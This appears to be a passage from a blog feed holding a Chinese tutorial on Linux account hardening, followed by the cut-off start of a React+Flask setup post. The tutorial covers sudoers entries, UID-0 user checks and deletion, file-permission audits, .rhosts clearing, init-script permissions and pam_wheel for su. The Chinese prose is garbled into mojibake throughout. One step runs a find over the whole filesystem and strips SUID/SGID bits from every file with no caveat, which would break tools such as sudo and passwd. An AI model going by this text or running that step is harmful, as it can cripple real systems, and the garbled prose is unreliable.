ç”¨æˆ·åœ¨æ‰€æœ‰ä¸»æœºï¼ˆALLï¼‰ä¸Šä»¥ä»»ä½•ç”¨æˆ·èº«ä»½ï¼ˆALLï¼‰æ‰§è¡Œä»»ä½•å‘½ä»¤ï¼ˆALLï¼‰çš„æƒé™ã€‚</span>%admin <span class="token assign-left variable">ALL</span><span class="token operator">=</span><span class="token punctuation">(</span>ALL<span class="token punctuation">)</span> ALL<span class="token comment"># è¿™ä¸€è¡Œå…è®¸ admin ç»„çš„æ‰€æœ‰æˆå‘˜åœ¨æ‰€æœ‰ä¸»æœºä¸Šæ‰§è¡Œä»»ä½•å‘½ä»¤ã€‚% ç¬¦å·ç”¨äºè¡¨ç¤ºç»„ï¼Œè€Œä¸æ˜¯å•ä¸ªç”¨æˆ·ã€‚</span>%sudo   <span class="token assign-left variable">ALL</span><span class="token operator">=</span><span class="token punctuation">(</span>ALL:ALL<span class="token punctuation">)</span> ALL<span class="token comment"># è¿™ä¸€è¡Œå…è®¸ sudo ç»„çš„æˆå‘˜åœ¨æ‰€æœ‰ä¸»æœºä¸Šä»¥ä»»ä½•ç”¨æˆ·èº«ä»½æ‰§è¡Œä»»ä½•å‘½ä»¤ã€‚</span>@includedir /etc/sudoers.d<span class="token comment"># è¿™ä¸€è¡Œæ˜¯ä¸€ä¸ªæŒ‡ä»¤ï¼Œå‘Šè¯‰ sudo å» /etc/sudoers.d ç›®å½•ä¸‹åŒ…å«é¢å¤–çš„é…ç½®æ–‡ä»¶ã€‚è¿™äº›æ–‡ä»¶é€šå¸¸ç”¨äºä¸ºä¸ªåˆ«ç”¨æˆ·æˆ–ç»„è®¾ç½®æ›´ç²¾ç»†çš„æƒé™ï¼Œè€Œä¸å¿…ç¼–è¾‘ä¸» /etc/sudoers æ–‡ä»¶</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><ul><li>root    ALL=(ALL:ALL) ALL</li></ul><ol><li><strong>root</strong>ï¼šè¿™æ˜¯ç”¨æˆ·åï¼Œè¡¨ç¤ºè¿™ä¸ªé…ç½®è§„åˆ™é€‚ç”¨äº root ç”¨æˆ·ã€‚</li><li><strong>ALL</strong>ï¼šè¿™æ˜¯ä¸»æœºï¼ˆæˆ–ä¸»æœºç»„ï¼‰çš„æŒ‡å®šï¼Œè¡¨ç¤ºè¿™ä¸ªè§„åˆ™é€‚ç”¨äºæ‰€æœ‰ä¸»æœºã€‚å½“ä½ æƒ³è¦ä¸ºç‰¹å®šä¸»æœºæˆ–ä¸€ç»„ä¸»æœºè®¾ç½®æƒé™æ—¶ï¼Œä½ å¯ä»¥åœ¨è¿™é‡ŒæŒ‡å®šä¸»æœºåæˆ–ä½¿ç”¨é€šé…ç¬¦ã€‚</li><li>**=(ALL:ALL)**ï¼šè¿™æ˜¯å§”æ‰˜ï¼ˆDelegationï¼‰éƒ¨åˆ†ï¼Œå®ƒå®šä¹‰äº†ç”¨æˆ·å¯ä»¥ä»¥å“ªäº›ç”¨æˆ·çš„èº«ä»½æ‰§è¡Œå‘½ä»¤ã€‚<ul><li>**(ALL:ALL)**ï¼šæ‹¬å·å†…çš„éƒ¨åˆ†è¡¨ç¤ºç”¨æˆ·å¯ä»¥ä»¥æ‰€æœ‰ç”¨æˆ·ï¼ˆALLï¼‰çš„èº«ä»½åœ¨æ‰€æœ‰ç»„ï¼ˆALLï¼‰ä¸­æ‰§è¡Œå‘½ä»¤ã€‚è¿™æ„å‘³ç€ root ç”¨æˆ·å¯ä»¥åˆ‡æ¢åˆ°ä»»ä½•ç”¨æˆ·å’Œç»„ã€‚</li></ul></li><li><strong>ALL</strong>ï¼šè¿™æ˜¯å‘½ä»¤çš„æŒ‡å®šï¼Œè¡¨ç¤ºè¿™ä¸ªè§„åˆ™é€‚ç”¨äºæ‰€æœ‰å‘½ä»¤ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œroot ç”¨æˆ·å¯ä»¥æ‰§è¡Œä»»ä½•å‘½ä»¤ã€‚</li></ol><p>ç»¼åˆæ¥çœ‹ï¼Œè¿™ä¸ªæ¡ç›®æ„å‘³ç€ root ç”¨æˆ·åœ¨æ‰€æœ‰ä¸»æœºä¸Šå¯ä»¥ä»¥ä»»ä½•ç”¨æˆ·çš„èº«ä»½æ‰§è¡Œä»»ä½•å‘½ä»¤ã€‚è¿™æ˜¯ root ç”¨æˆ·çš„é»˜è®¤æƒé™ï¼Œé€šå¸¸ä¸éœ€è¦åœ¨ <code>/etc/sudoers</code> æ–‡ä»¶ä¸­æ˜¾å¼å†™å‡ºï¼Œå› ä¸º root ç”¨æˆ·é»˜è®¤å°±æœ‰æ‰€æœ‰æƒé™ã€‚ä½†æ˜¯ï¼Œä¸ºäº†æ¸…æ™°å’Œå®Œæ•´æ€§ï¼Œæœ‰æ—¶ç®¡ç†å‘˜ä¼šåœ¨ <code>/etc/sudoers</code> æ–‡ä»¶ä¸­æ˜¾å¼åœ°å£°æ˜è¿™ä¸€ç‚¹ã€‚</p><ul><li>ä¸»æœºçš„æ¦‚å¿µ</li></ul><p>åœ¨ <code>/etc/sudoers</code> æ–‡ä»¶ä¸­çš„ â€œä¸»æœºâ€ï¼ˆHostï¼‰æŒ‡å®šéƒ¨åˆ†ï¼ŒæŒ‡çš„æ˜¯ sudo å‘½ä»¤å¯ä»¥è¢«æ‰§è¡Œçš„è®¡ç®—æœºæˆ–æœåŠ¡å™¨ã€‚è¿™ä¸ªæ¦‚å¿µå…è®¸ç®¡ç†å‘˜ä¸ºä¸åŒçš„æœºå™¨è®¾ç½®ä¸åŒçš„æƒé™è§„åˆ™ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å…·ä½“çš„ä¾‹å­ï¼š</p><ol><li><strong>ç‰¹å®šä¸»æœº</strong>ï¼šä½ å¯ä»¥ä¸ºç‰¹å®šçš„ä¸»æœºè®¾ç½® sudo æƒé™ã€‚ä¾‹å¦‚ï¼Œ<code>user host1=(ALL) ALL</code> è¡¨ç¤ºç”¨æˆ·åœ¨åä¸º <code>host1</code> çš„ä¸»æœºä¸Šå¯ä»¥æ‰§è¡Œä»»ä½•å‘½ä»¤ã€‚</li><li><strong>æ‰€æœ‰ä¸»æœº</strong>ï¼šä½¿ç”¨ <code>ALL</code> è¡¨ç¤ºè§„åˆ™é€‚ç”¨äºæ‰€æœ‰ä¸»æœºã€‚ä¾‹å¦‚ï¼Œ<code>user ALL=(ALL) ALL</code> å…è®¸ç”¨æˆ·åœ¨æ‰€æœ‰ä¸»æœºä¸Šæ‰§è¡Œä»»ä½•å‘½ä»¤ã€‚</li><li><strong>ä¸»æœºç»„</strong>ï¼šåœ¨æŸäº›ç³»ç»Ÿä¸­ï¼Œä½ å¯ä»¥å®šä¹‰ä¸»æœºç»„ï¼Œå¹¶ä¸ºæ•´ä¸ªç»„è®¾ç½®æƒé™ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä½ æœ‰ä¸€ä¸ªåä¸º <code>webservers</code> çš„ä¸»æœºç»„ï¼Œä½ å¯ä»¥è®¾ç½® <code>user @webservers=(ALL) ALL</code> æ¥å…è®¸ç”¨æˆ·åœ¨æ‰€æœ‰å±äº <code>webservers</code> ç»„çš„ä¸»æœºä¸Šæ‰§è¡Œå‘½ä»¤ã€‚</li><li><strong>IP åœ°å€</strong>ï¼šä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ IP åœ°å€æ¥æŒ‡å®šä¸»æœºã€‚ä¾‹å¦‚ï¼Œ<code>user 192.168.1.100=(ALL) ALL</code> å…è®¸ç”¨æˆ·åœ¨ IP åœ°å€ä¸º <code>192.168.1.100</code> çš„ä¸»æœºä¸Šæ‰§è¡Œå‘½ä»¤ã€‚</li><li><strong>ç½‘ç»œèŒƒå›´</strong>ï¼šä½¿ç”¨ç½‘ç»œèŒƒå›´æŒ‡å®šä¸»æœºï¼Œå¦‚ <code>user 192.168.1.%=(ALL) ALL</code> å…è®¸ç”¨æˆ·åœ¨ <code>192.168.1.</code> ç½‘ç»œèŒƒå›´å†…çš„æ‰€æœ‰ä¸»æœºä¸Šæ‰§è¡Œå‘½ä»¤ã€‚</li></ol><p>åœ¨è¿œç¨‹ç®¡ç†å¤šä¸ªæœåŠ¡å™¨çš„ç¯å¢ƒä¸­ï¼Œè¿™ç§çµæ´»æ€§å…è®¸ç®¡ç†å‘˜ä¸ºä¸åŒçš„æœåŠ¡å™¨è®¾ç½®ä¸åŒçš„è®¿é—®æ§åˆ¶ç­–ç•¥ï¼Œä»¥å¢å¼ºå®‰å…¨æ€§å’Œç®¡ç†æ•ˆç‡ã€‚</p></blockquote><h2 id="5-3-æŸ¥æ‰¾é™¤rootä¹‹å¤–uidä¸º0çš„ç”¨æˆ·å¹¶å°†å…¶åˆ é™¤"><a href="#5-3-æŸ¥æ‰¾é™¤rootä¹‹å¤–uidä¸º0çš„ç”¨æˆ·å¹¶å°†å…¶åˆ é™¤" class="headerlink" title="5.3 æŸ¥æ‰¾é™¤rootä¹‹å¤–uidä¸º0çš„ç”¨æˆ·å¹¶å°†å…¶åˆ é™¤"></a>5.3 æŸ¥æ‰¾é™¤rootä¹‹å¤–uidä¸º0çš„ç”¨æˆ·å¹¶å°†å…¶åˆ é™¤</h2><img src="/2024/12/11/an-quan-jia-gu/linux-an-quan-jia-gu-zhi-zhang-hu-an-quan-jia-gu/%E6%88%AA%E5%B1%8F2024-12-11%2014.50.14.png" style="zoom:50%;"><blockquote><ul><li>è¿™ä¸ªå‘½ä»¤ä½¿ç”¨ <code>awk</code> å·¥å…·æ¥å¤„ç† <code>/etc/passwd</code> æ–‡ä»¶ã€‚<code>/etc/passwd</code> æ˜¯ä¸€ä¸ªå­˜å‚¨ç³»ç»Ÿç”¨æˆ·è´¦æˆ·ä¿¡æ¯çš„æ–‡ä»¶ã€‚</li><li><code>-F:</code> æŒ‡å®šäº†å­—æ®µåˆ†éš”ç¬¦ä¸ºå†’å· <code>:</code>ã€‚</li><li><code>($3==0)</code> æ˜¯ä¸€ä¸ªæ¡ä»¶è¡¨è¾¾å¼ï¼Œæ£€æŸ¥ç¬¬ä¸‰ä¸ªå­—æ®µï¼ˆç”¨æˆ· IDï¼Œé€šå¸¸æ˜¯ <code>UID</code>ï¼‰æ˜¯å¦ä¸º0ã€‚åœ¨ Unix å’Œç±» Unix ç³»ç»Ÿä¸­ï¼ŒUID ä¸º0é€šå¸¸è¡¨ç¤º root ç”¨æˆ·ã€‚</li><li><code>{print $1}</code> å¦‚æœæ¡ä»¶ä¸ºçœŸï¼Œåˆ™æ‰“å°å‡ºç¬¬ä¸€ä¸ªå­—æ®µï¼Œå³ç”¨æˆ·åã€‚</li><li>ä½†æ˜¯ï¼Œè¿™ä¸ªå‘½ä»¤æœ‰ä¸€ä¸ªè¯­æ³•é”™è¯¯ã€‚æ­£ç¡®çš„å‘½ä»¤åº”è¯¥æ˜¯ <code>awk -F: '$3==0 {print $1}' /etc/passwd</code>ï¼Œè¿™æ ·å®ƒä¼šæ‰“å°å‡ºæ‰€æœ‰ UID ä¸º0çš„ç”¨æˆ·åã€‚</li></ul></blockquote><p>å¦‚æœå‘ç°testç”¨æˆ·uidä¸º0ï¼Œå°†å…¶åˆ é™¤ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">userdel</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-f</span> <span class="token builtin class-name">test</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>è¿™ä¸ªå‘½ä»¤ç”¨äºåˆ é™¤ç”¨æˆ· <code>test</code>ã€‚</li><li><code>-r</code> é€‰é¡¹è¡¨ç¤ºåŒæ—¶åˆ é™¤ç”¨æˆ·çš„å®¶ç›®å½•å’Œé‚®ä»¶é˜Ÿåˆ—ã€‚</li><li><code>-f</code> é€‰é¡¹è¡¨ç¤ºå¼ºåˆ¶åˆ é™¤ç”¨æˆ·ï¼Œå³ä½¿ç”¨æˆ·å½“å‰ç™»å½•ä¹Ÿä¸ä¼šå½±å“åˆ é™¤æ“ä½œã€‚</li></ul><h2 id="5-4-é«˜æƒé™æ–‡ä»¶"><a href="#5-4-é«˜æƒé™æ–‡ä»¶" class="headerlink" title="5.4 é«˜æƒé™æ–‡ä»¶"></a>5.4 é«˜æƒé™æ–‡ä»¶</h2><h3 id="5-4-1-æ£€æŸ¥æ˜¯å¦æœ‰æ–‡ä»¶å­˜åœ¨è¿‡é«˜çš„æƒé™"><a href="#5-4-1-æ£€æŸ¥æ˜¯å¦æœ‰æ–‡ä»¶å­˜åœ¨è¿‡é«˜çš„æƒé™" class="headerlink" title="5.4.1 æ£€æŸ¥æ˜¯å¦æœ‰æ–‡ä»¶å­˜åœ¨è¿‡é«˜çš„æƒé™"></a>5.4.1 æ£€æŸ¥æ˜¯å¦æœ‰æ–‡ä»¶å­˜åœ¨è¿‡é«˜çš„æƒé™</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-type</span> f <span class="token punctuation">\</span><span class="token punctuation">(</span> <span class="token parameter variable">-perm</span> <span class="token parameter variable">-0007</span> <span class="token punctuation">\</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token parameter variable">-I</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token function">ls</span> <span class="token parameter variable">-lh</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><ul><li><code>find / -type f</code>ï¼šä»æ ¹ç›®å½• <code>/</code> å¼€å§‹æŸ¥æ‰¾æ‰€æœ‰ç±»å‹ä¸ºæ–‡ä»¶çš„é¡¹ã€‚</li><li><code>(-perm -0007)</code>ï¼šæŸ¥æ‰¾æƒé™ä¸º 7ï¼ˆå³æ‰€æœ‰ç”¨æˆ·éƒ½æœ‰è¯»ã€å†™ã€æ‰§è¡Œæƒé™ï¼‰çš„æ–‡ä»¶ã€‚</li><li><code>xargs -I {} ls -lh {}</code>ï¼šå¯¹æ‰¾åˆ°çš„æ¯ä¸ªæ–‡ä»¶æ‰§è¡Œ <code>ls -lh</code> å‘½ä»¤ï¼Œæ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ–‡ä»¶æƒé™ã€æ‰€æœ‰è€…ã€å¤§å°å’Œä¿®æ”¹æ—¥æœŸã€‚</li></ul></blockquote><h3 id="5-4-2-å»æ‰æ‰€æœ‰æ–‡ä»¶çš„-SUID-å’Œ-SGID"><a href="#5-4-2-å»æ‰æ‰€æœ‰æ–‡ä»¶çš„-SUID-å’Œ-SGID" class="headerlink" title="5.4.2 å»æ‰æ‰€æœ‰æ–‡ä»¶çš„ SUID å’Œ SGID"></a>5.4.2 å»æ‰æ‰€æœ‰æ–‡ä»¶çš„ SUID å’Œ SGID</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-type</span> f <span class="token punctuation">\</span><span class="token punctuation">(</span> <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-o</span> <span class="token parameter variable">-perm</span> <span class="token parameter variable">-2000</span> <span class="token punctuation">\</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token parameter variable">-I</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token function">chmod</span> ug-s <span class="token punctuation">{</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><ul><li><code>find / -type f</code>ï¼šåŒæ ·ä»æ ¹ç›®å½•å¼€å§‹æŸ¥æ‰¾æ‰€æœ‰æ–‡ä»¶ã€‚</li><li><code>(-perm -4000 -o -perm -2000)</code>ï¼šæŸ¥æ‰¾è®¾ç½®äº† SUIDï¼ˆ4000ï¼‰æˆ– SGIDï¼ˆ2000ï¼‰ä½çš„æ–‡ä»¶ã€‚</li><li><code>xargs -I {} chmod ug-s {}</code>ï¼šå¯¹æ‰¾åˆ°çš„æ¯ä¸ªæ–‡ä»¶æ‰§è¡Œ <code>chmod ug-s</code> å‘½ä»¤ï¼Œç§»é™¤ SUID å’Œ SGID ä½ã€‚</li></ul></blockquote><h2 id="5-5-ç¦æ­¢ä½¿ç”¨ä»»æ„ç”¨æˆ·-rlogin-ç™»å½•"><a href="#5-5-ç¦æ­¢ä½¿ç”¨ä»»æ„ç”¨æˆ·-rlogin-ç™»å½•" class="headerlink" title="5.5 ç¦æ­¢ä½¿ç”¨ä»»æ„ç”¨æˆ· rlogin ç™»å½•"></a>5.5 ç¦æ­¢ä½¿ç”¨ä»»æ„ç”¨æˆ· rlogin ç™»å½•</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /dev/null <span class="token operator">&gt;</span> /root/.rhosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><ul><li><code>cat /dev/null</code>ï¼šåˆ›å»ºä¸€ä¸ªç©ºæ–‡ä»¶ã€‚</li><li><code>&gt; /root/.rhosts</code>ï¼šå°†è¿™ä¸ªç©ºæ–‡ä»¶é‡å®šå‘åˆ° <code>/root/.rhosts</code>ã€‚è¿™ä¸ªæ–‡ä»¶ç”¨äºæ§åˆ¶å“ªäº›è¿œç¨‹ç”¨æˆ·å¯ä»¥é€šè¿‡ rlogin è®¿é—® root ç”¨æˆ·ã€‚æ¸…ç©ºè¿™ä¸ªæ–‡ä»¶å¯ä»¥é˜²æ­¢ä»»ä½•ç”¨æˆ·é€šè¿‡ rlogin ï¼ˆè¿œç¨‹ç™»å½•ï¼‰ç™»å½•ä¸º rootã€‚</li></ul><p>è¿™äº›å‘½ä»¤ç”¨äºå¢å¼ºç³»ç»Ÿçš„å®‰å…¨æ€§ï¼Œé€šè¿‡é™åˆ¶æƒé™å’Œæ§åˆ¶è®¿é—®æ¥å‡å°‘æ½œåœ¨çš„å®‰å…¨é£é™©ã€‚</p></blockquote><h2 id="5-6-å¯åŠ¨è„šæœ¬æ–‡ä»¶æƒé™ç®¡ç†"><a href="#5-6-å¯åŠ¨è„šæœ¬æ–‡ä»¶æƒé™ç®¡ç†" class="headerlink" title="5.6 å¯åŠ¨è„šæœ¬æ–‡ä»¶æƒé™ç®¡ç†"></a>5.6 å¯åŠ¨è„šæœ¬æ–‡ä»¶æƒé™ç®¡ç†</h2><ol><li><strong>ä»»åŠ¡æè¿°</strong>ï¼šæ£€æŸ¥å¹¶ä¿®å¤å¯åŠ¨è„šæœ¬æ–‡ä»¶æƒé™ï¼Œä»¥é˜²æ­¢æ½œåœ¨çš„å®‰å…¨æ¼æ´ï¼Œå¦‚æœªæˆæƒè®¿é—®æˆ–æ¶æ„è½¯ä»¶ï¼ˆæœ¨é©¬ï¼‰çš„æ¤å…¥ã€‚</li><li><strong>å‘½ä»¤å’Œè¾“å‡º</strong>ï¼š<ul><li><code>ls -l /etc/rc.d/init.d</code>ï¼šåˆ—å‡º <code>/etc/rc.d/init.d</code> ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶åŠå…¶æƒé™ã€‚è¿™ä¸ªç›®å½•é€šå¸¸åŒ…å«ç³»ç»Ÿå¯åŠ¨æ—¶è¿è¡Œçš„è„šæœ¬ã€‚</li><li>è¾“å‡ºæ˜¾ç¤ºäº†å¤šä¸ªæ–‡ä»¶çš„æƒé™ï¼Œå…¶ä¸­ä¸€äº›æ–‡ä»¶å…·æœ‰ <code>rwx</code>ï¼ˆè¯»ã€å†™ã€æ‰§è¡Œï¼‰æƒé™ï¼Œè¿™æ„å‘³ç€æ‰€æœ‰ç”¨æˆ·éƒ½å¯ä»¥æ‰§è¡Œè¿™äº›è„šæœ¬ï¼Œè¿™å¯èƒ½æ˜¯ä¸€ä¸ªå®‰å…¨é£é™©ã€‚</li></ul></li><li><strong>ä¿®å¤å‘½ä»¤</strong>ï¼š<ul><li><code>chmod 700 /etc/rc.d/init.d/*</code>ï¼šå°† <code>/etc/rc.d/init.d</code> ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶çš„æƒé™æ›´æ”¹ä¸º <code>700</code>ï¼Œè¿™æ„å‘³ç€åªæœ‰æ–‡ä»¶æ‰€æœ‰è€…ï¼ˆé€šå¸¸æ˜¯ rootï¼‰å¯ä»¥è¯»å–ã€å†™å…¥å’Œæ‰§è¡Œè¿™äº›æ–‡ä»¶ï¼Œå¢å¼ºå®‰å…¨æ€§ã€‚</li></ul></li></ol><h2 id="5-7-é™åˆ¶ç”¨æˆ·ä½¿ç”¨-su-åˆ‡æ¢åˆ°-root"><a href="#5-7-é™åˆ¶ç”¨æˆ·ä½¿ç”¨-su-åˆ‡æ¢åˆ°-root" class="headerlink" title="5.7 é™åˆ¶ç”¨æˆ·ä½¿ç”¨ su åˆ‡æ¢åˆ° root"></a>5.7 é™åˆ¶ç”¨æˆ·ä½¿ç”¨ <code>su</code> åˆ‡æ¢åˆ° root</h2><ol><li><strong>ä»»åŠ¡æè¿°</strong>ï¼šé…ç½®ç³»ç»Ÿä»¥é™åˆ¶åªæœ‰ç‰¹å®šç»„ï¼ˆå¦‚ wheel ç»„ï¼‰çš„ç”¨æˆ·æ‰èƒ½ä½¿ç”¨ <code>su</code> å‘½ä»¤åˆ‡æ¢åˆ° root ç”¨æˆ·ã€‚</li><li><strong>é…ç½®æ­¥éª¤</strong>ï¼š<ul><li>ç¼–è¾‘ <code>/etc/pam.d/su</code> æ–‡ä»¶ï¼Œæ·»åŠ  <code>auth required pam_wheel.so group=wheel</code>ã€‚è¿™è¡Œé…ç½®ç¡®ä¿åªæœ‰ wheel ç»„çš„æˆå‘˜æ‰èƒ½ä½¿ç”¨ <code>su</code> å‘½ä»¤åˆ‡æ¢åˆ° rootã€‚</li></ul></li><li><strong>éªŒè¯æ­¥éª¤</strong>ï¼š<ul><li>ä½¿ç”¨ <code>grep wheel /etc/group</code> æ£€æŸ¥ wheel ç»„çš„æˆå‘˜ã€‚è¾“å‡ºæ˜¾ç¤º <code>zhangsan</code> æ˜¯ wheel ç»„çš„æˆå‘˜ã€‚</li><li>å°è¯•ä½¿ç”¨ <code>su -l root</code> å‘½ä»¤åˆ‡æ¢åˆ° root ç”¨æˆ·ã€‚<code>zhangsan</code> æˆåŠŸåˆ‡æ¢åˆ° rootï¼Œè€Œ <code>lisi</code> å› ä¸ºä¸æ˜¯ wheel ç»„çš„æˆå‘˜ï¼Œå°è¯•å¤±è´¥å¹¶æ”¶åˆ° â€œPermission deniedâ€ çš„æ¶ˆæ¯ã€‚</li></ul></li></ol><h1 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h1><p>Linuxç³»ç»Ÿè´¦æˆ·å®‰å…¨åŠ å›ºå¯¹äºä¿æŠ¤æœåŠ¡å™¨å’Œæ•°æ®è‡³å…³é‡è¦ã€‚é€šè¿‡é™åˆ¶SUIDå’ŒSGIDä½ï¼Œå¯ä»¥é˜²æ­¢æ¶æ„ç¨‹åºè·å–è¿‡é«˜æƒé™ï¼›ä¸¥æ ¼ç®¡ç†æ–‡ä»¶æƒé™ï¼Œé¿å…æœªæˆæƒè®¿é—®ï¼›ä½¿ç”¨<code>chmod</code>å‘½ä»¤é™åˆ¶å¯åŠ¨è„šæœ¬çš„è®¿é—®æƒé™ï¼Œé˜²æ­¢æ¶æ„ä»£ç æ‰§è¡Œã€‚æ­¤å¤–ï¼Œé€šè¿‡é…ç½®<code>/etc/pam.d/su</code>æ–‡ä»¶ï¼Œé™åˆ¶åªæœ‰ç‰¹å®šç”¨æˆ·ç»„èƒ½ä½¿ç”¨<code>su</code>åˆ‡æ¢åˆ°rootï¼Œè¿›ä¸€æ­¥å¢å¼ºå®‰å…¨æ€§ã€‚è¿™äº›æªæ–½å…±åŒæ„å»ºäº†ä¸€ä¸ªæ›´åŠ å®‰å…¨çš„ç¯å¢ƒï¼Œé˜²æ­¢æœªæˆæƒè®¿é—®ã€æ•°æ®æ³„éœ²å’Œç³»ç»Ÿè¢«æ¶æ„è½¯ä»¶æ„ŸæŸ“ï¼Œç¡®ä¿ç³»ç»Ÿç¨³å®šæ€§å’Œæ•°æ®å®Œæ•´æ€§ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨åŠ å›º </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å®‰å…¨åŠ å›º </tag>
            
            <tag> Linuxå®‰å…¨åŠ å›º </tag>
            
            <tag> è´¦æˆ·å®‰å…¨åŠ å›º </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>React+Flaskå‰åç«¯åˆ†ç¦»å¼€å‘</title>
      <link href="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/"/>
      <url>/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€åŠ¨æœº"><a href="#ä¸€ã€åŠ¨æœº" class="headerlink" title="ä¸€ã€åŠ¨æœº"></a>ä¸€ã€åŠ¨æœº</h1><p>é€šè¿‡ <strong>React</strong>ï¼ˆå‰ç«¯æ¡†æ¶ï¼‰å’Œ <strong>Flask</strong>ï¼ˆåç«¯æ¡†æ¶ï¼‰æ„å»ºä¸€ä¸ªåˆå§‹ç½‘ç«™ï¼Œå¯ä»¥ç»“åˆå®ƒä»¬çš„ä¼˜åŠ¿ï¼Œå‰ç«¯è´Ÿè´£äº¤äº’ç•Œé¢ï¼Œåç«¯æä¾› API æ¥å£ã€‚</p><h1 id="äºŒã€å‡†å¤‡ç¯å¢ƒ"><a href="#äºŒã€å‡†å¤‡ç¯å¢ƒ" class="headerlink" title="äºŒã€å‡†å¤‡ç¯å¢ƒ"></a>äºŒã€å‡†å¤‡ç¯å¢ƒ</h1><h2 id="2-1-å®‰è£…å¿…è¦å·¥å…·"><a href="#2-1-å®‰è£…å¿…è¦å·¥å…·" class="headerlink" title="2.1 å®‰è£…å¿…è¦å·¥å…·"></a>2.1 å®‰è£…å¿…è¦å·¥å…·</h2><ul><li>ç¡®ä¿å®‰è£…äº† <a href="https://nodejs.org/">Node.js</a> å’Œ npmï¼Œç”¨äºç®¡ç† React é¡¹ç›®ã€‚</li><li>ç¡®ä¿å®‰è£…äº† Pythonï¼ˆæ¨è 3.8 åŠä»¥ä¸Šç‰ˆæœ¬ï¼‰å’Œ pipï¼Œç”¨äºç®¡ç† Flask é¡¹ç›®ã€‚</li></ul><blockquote><h3 id="npmæ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#npmæ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="npmæ˜¯ä»€ä¹ˆï¼Ÿ"></a>npmæ˜¯ä»€ä¹ˆï¼Ÿ</h3><p>npm æ˜¯ Node Package Managerï¼ˆèŠ‚ç‚¹åŒ…ç®¡ç†å™¨ï¼‰çš„ç¼©å†™ï¼Œå®ƒæ˜¯ JavaScript è¿è¡Œæ—¶ç¯å¢ƒ Node.js çš„é»˜è®¤åŒ…ç®¡ç†å™¨ã€‚</p><p>npm ç”¨äºç®¡ç†å’Œå®‰è£… Node.js åº”ç”¨ç¨‹åºæ‰€éœ€çš„å„ç§ä»£ç åº“å’Œå·¥å…·ï¼Œè¿™äº›ä»£ç åº“å’Œå·¥å…·è¢«ç§°ä¸ºâ€œåŒ…â€æˆ–â€œæ¨¡å—â€ã€‚</p><p>ä»¥ä¸‹æ˜¯ npm çš„ä¸€äº›ä¸»è¦åŠŸèƒ½ï¼š</p><ol><li><strong>ä¾èµ–ç®¡ç†</strong>ï¼šnpm å…è®¸ä½ ä¸ºä½ çš„é¡¹ç›®å®šä¹‰ä¾èµ–å…³ç³»ï¼Œå¹¶é€šè¿‡ <code>package.json</code> æ–‡ä»¶æ¥ç®¡ç†è¿™äº›ä¾èµ–ã€‚è¿™ä½¿å¾—é¡¹ç›®å¯ä»¥è½»æ¾åœ°åœ¨ä¸åŒçš„å¼€å‘ç¯å¢ƒä¸­å…±äº«å’Œéƒ¨ç½²ã€‚</li><li><strong>åŒ…å®‰è£…</strong>ï¼šä½ å¯ä»¥ä½¿ç”¨ npm æ¥å®‰è£…é¡¹ç›®æ‰€éœ€çš„åŒ…ã€‚è¿™äº›åŒ…å¯ä»¥æ˜¯ç¬¬ä¸‰æ–¹åº“ï¼Œä¹Ÿå¯ä»¥æ˜¯ä½ è‡ªå·±çš„ä»£ç æ¨¡å—ã€‚</li><li><strong>ç‰ˆæœ¬æ§åˆ¶</strong>ï¼šnpm æ”¯æŒè¯­ä¹‰åŒ–ç‰ˆæœ¬æ§åˆ¶ï¼Œå…è®¸ä½ æŒ‡å®šä¾èµ–çš„ç‰ˆæœ¬èŒƒå›´ï¼Œä»¥ç¡®ä¿å…¼å®¹æ€§ã€‚</li><li><strong>åŒ…å‘å¸ƒ</strong>ï¼šå¼€å‘è€…å¯ä»¥å°†è‡ªå·±çš„åŒ…å‘å¸ƒåˆ° npm çš„å…¬å…±ä»“åº“ï¼Œä¾›å…¶ä»–å¼€å‘è€…ä½¿ç”¨ã€‚</li><li><strong>å…¨å±€å®‰è£…</strong>ï¼šnpm å…è®¸ä½ å…¨å±€å®‰è£…åŒ…ï¼Œè¿™æ ·ä½ 